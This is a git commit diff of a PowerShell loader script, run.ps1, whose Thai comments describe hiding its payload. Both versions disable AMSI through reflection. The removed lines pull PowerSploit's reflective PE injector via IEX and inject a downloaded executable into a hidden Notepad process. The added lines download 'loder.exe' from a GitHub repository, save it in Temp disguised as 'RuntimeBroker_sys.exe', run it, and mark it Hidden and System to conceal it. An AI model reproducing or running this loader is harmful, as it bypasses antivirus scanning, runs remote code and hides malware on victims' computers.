286d87fd4758e892345c302b316ac9068bc2372c
077x1 <nazerxyz01@gmail.com>
2026-05-19 15:24:08 +0700

    run.ps1

--- run.ps1
+++ run.ps1
@@ -1,32 +1,28 @@
-Write-Host "[*] Bypassing AMSI..." -ForegroundColor Yellow
+Write-Host "[*] Bypassing Security..." -ForegroundColor Yellow
 $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
 $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
 
-Write-Host "[*] Fetching Injector from 077x1..." -ForegroundColor Yellow
-$injUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-IEX (New-Object Net.WebClient).DownloadString($injUrl)
-
-Write-Host "[*] Downloading Payload..." -ForegroundColor Yellow
+Write-Host "[*] Downloading UI Payload..." -ForegroundColor Yellow
 $exeUrl = "https://raw.githubusercontent.com/077x1/loader/main/loder.exe" 
 $WebClient = New-Object System.Net.WebClient
 try {
     $PEBytes = $WebClient.DownloadData($exeUrl)
-    Write-Host "[+] Downloaded $($PEBytes.Length) bytes." -ForegroundColor Green
 } catch {
-    Write-Host "[-] Failed to download payload." -ForegroundColor Red
+    Write-Host "[-] Download failed!" -ForegroundColor Red
     exit
 }
 
-Write-Host "[*] Finding Notepad..."
-$targetProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
-if (-not $targetProc) {
-    Start-Process -FilePath "notepad.exe" -WindowStyle Hidden
-    Start-Sleep -Seconds 1
-    $targetProc = Get-Process -Name "notepad" | Select-Object -First 1
-}
+Write-Host "[*] Preparing Ghost Process..." -ForegroundColor Cyan
+# ปลอมตัวเป็นไฟล์ระบบ แอบอยู่ในโฟลเดอร์ Temp
+$ghostPath = "$env:TEMP\RuntimeBroker_sys.exe"
+[System.IO.File]::WriteAllBytes($ghostPath, $PEBytes)
 
-Write-Host "[*] Injecting into PID: $($targetProc.Id) ..." -ForegroundColor Cyan
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcId $targetProc.Id
+# สั่งรันโปรแกรมมึง
+Start-Process -FilePath $ghostPath
 
-Write-Host "[+] Done! UI should appear now." -ForegroundColor Green
+Write-Host "[*] Wiping tracks..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+# ซ่อนไฟล์ขั้นสุด (ติ๊ก Show hidden files ในคอมก็มองไม่เห็น ต้องใช้ Command ดูเท่านั้น)
+Set-ItemProperty -Path $ghostPath -Name Attributes -Value "Hidden, System"
+
+Write-Host "[+] DONE! UI Is Active." -ForegroundColor Green
